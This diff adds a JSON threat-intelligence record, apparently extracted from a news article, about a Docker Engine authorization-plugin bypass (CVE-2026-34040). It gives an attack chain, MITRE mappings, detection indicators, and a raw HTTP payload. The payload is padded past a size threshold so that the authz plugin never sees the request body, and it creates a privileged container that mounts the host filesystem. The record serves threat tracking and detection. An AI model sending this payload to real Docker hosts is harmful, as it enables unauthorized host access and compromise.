@@ -1,0 +1,86 @@
+{
+  "cached_at": "2026-04-13T13:22:51.031224+00:00",
+  "extraction": {
+    "signal_id": "680432149ee655b3",
+    "source_name": "thehackernews",
+    "article_url": "https://thehackernews.com/2026/04/docker-cve-2026-34040-lets-attackers.html",
+    "article_title": "Docker CVE-2026-34040 Lets Attackers Bypass Authorization and Gain Host Access",
+    "pub_date": "Tue, 07 Apr 2026 20:45:00 +0530",
+    "trust_score": 0.85,
+    "cves": [
+      "CVE-2026-34040",
+      "CVE-2024-41110"
+    ],
+    "iocs": {},
+    "threat_actors": [],
+    "malware_families": [],
+    "ttps": [
+      {
+        "mitre_id": "T1611",
+        "description": "Escape to Host via container runtime abuse and privileged container creation after authorization bypass."
+      },
+      {
+        "mitre_id": "T1190",
+        "description": "Exploit public-facing application/API weakness by abusing Docker Engine API request handling and authz plugin behavior."
+      }
+    ],
+    "attack_chain": [
+      "Attacker obtains access to Docker Engine API protected by an authorization plugin.",
+      "Attacker submits an oversized container-creation request padded beyond the body-handling threshold.",
+      "Docker daemon forwards the request to the authz plugin without the request body.",
+      "Authz plugin cannot inspect the body and allows the request.",
+      "Docker daemon processes the full request and creates a privileged container.",
+      "Container gains access to host filesystem and sensitive host data."
+    ],
+    "target_industries": [
+      "cloud",
+      "devops",
+      "software development",
+      "managed services",
+      "kubernetes operations"
+    ],
+    "target_technologies": [
+      "docker",
+      "docker engine",
+      "docker api",
+      "authorization plugins",
+      "authz",
+      "container runtime",
+      "linux"
+    ],
+    "proposed_vectors": [
+      {
+        "id": "WEB-DOCKER-001",
+        "name_en": "Oversized Docker API body truncation to bypass AuthZ inspection",
+        "name_ko": "Docker API 본문 초과로 인한 AuthZ 검사 우회",
+        "phase": "P4_cpr",
+        "risk": "high"
+      }
+    ],
+    "proposed_phase_updates": [],
+    "proposed_kb_patterns": [
+      {
+        "technique": "auth_bypass",
+        "attack_description": "Abuse a size-dependent request handling flaw where the authorization layer receives no request body when the HTTP payload exceeds a threshold, allowing a privileged action to be approved based on incomplete context.",
+        "payload": "POST /v1.45/containers/create HTTP/1.1\r\nHost: docker.example:2375\r\nContent-Type: application/json\r\nContent-Length: 1500123\r\n\r\n{\"Image\":\"alpine\",\"Cmd\":[\"sh\",\"-c\",\"id > /host/tmp/pwned\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host:rw\"]},\"Labels\":{\"pad\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}}",
+        "detect": [
+          "HTTP 201 Created despite authz policy that normally blocks privileged containers",
+          "Container starts with Privileged=true and host bind mount present",
+          "Evidence of host file write such as /host/tmp/pwned",
+          "AuthZ logs show request allowed with missing or empty body context"
+        ],
+        "affected_tech": [
+          "docker",
+          "docker engine",
+          "docker api",
+          "authorization plugins",
+          "authz"
+        ],
+        "severity": "critical"
+      }
+    ],
+    "proposed_waf_variants": [],
+    "proposed_actor_updates": [],
+    "extracted_at": "2026-04-13T13:22:51.031144+00:00"
+  }
+}
